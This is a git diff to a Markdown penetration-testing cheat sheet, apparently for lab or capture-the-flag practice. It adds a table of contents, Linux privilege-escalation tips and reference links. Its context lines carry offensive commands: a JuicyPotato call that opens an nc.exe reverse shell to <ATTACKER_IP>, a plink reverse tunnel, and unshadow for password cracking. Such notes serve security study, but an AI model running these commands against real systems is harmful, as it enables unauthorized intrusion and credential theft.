@@ -1,6 +1,14 @@
 <!-- TABLE OF CONTENTS -->
 <details open="open">
   <summary>Table of Contents</summary>
+   <ol>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a></li>
+        <li><a href="#after-first-shell">After first shell</a></li>
+        <li><a href="#general">General</a></li>
+        <li><a href="#privilege-escalation">Privilege escalation</a></li>
+        <li><a href="#references">References</a></li>
+   </ol>
 </details>
 
 
@@ -109,7 +117,7 @@
         
         
         
-## Reverse Sheel
+## Reverse Shell
 
 * Netcat OpenBSD (and also some Linux)
 
@@ -184,6 +192,9 @@
         cmd.exe /c echo y | plink.exe -ssh 10.10.14.16 -P 22022 -l attacker_username -pw RandomPassword123 -R 10.10.14.16:1234:127.0.0.1:8888
         ```
 
+
+
+
 ## General
 
 * Generate a wordlist based on specific page:
@@ -243,6 +254,11 @@
     ```
     /usr/sbin/unshadow passwd_file.txt shadow_file.txt > <OUT_FILE>
     ```
+
+
+
+
+
 
 ## Privilege escalation
 
@@ -305,16 +321,39 @@
         juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\folde\with\nc\nc.exe <ATTACKER_IP> 4444 -e cmd.exe" -t * -c {clsid}
         ```
 
+
+
+
 ### Linux
 
+* Simple sudo without password:
+    ```
+    sudo su -
+    ```
+
+* List allowed sudo commands:
+    ```
+    sudo -l
+    ```
+
+* Crontab (see more tips ):
+    ```
+    crontab -l
+    ```
+
+* Another commands see: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
 * LinEnum:
-    https://github.com/rebootuser/LinEnum
+    * https://github.com/rebootuser/LinEnum
 
-* /* TODO */
+* Privesc using `cp` command:
+    * https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/
+
+* Privesc using SUID binaries:
+    * https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
 
 
-
-### Links
+### References
 
 * Payload all the things: https://github.com/swisskyrepo/PayloadsAllTheThings
 * GTFOBins: https://gtfobins.github.io/gtfobins/nmap/
@@ -329,3 +368,5 @@
     * Commands to test: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
     * MS SQL Client on Kali: https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell/
     * How to use xp_cmdshell: https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/
+* Exploit-db bin sploits: https://github.com/offensive-security/exploitdb-bin-sploits
+* Privesc Hacking Articles: https://www.hackingarticles.in/category/privilege-escalation/
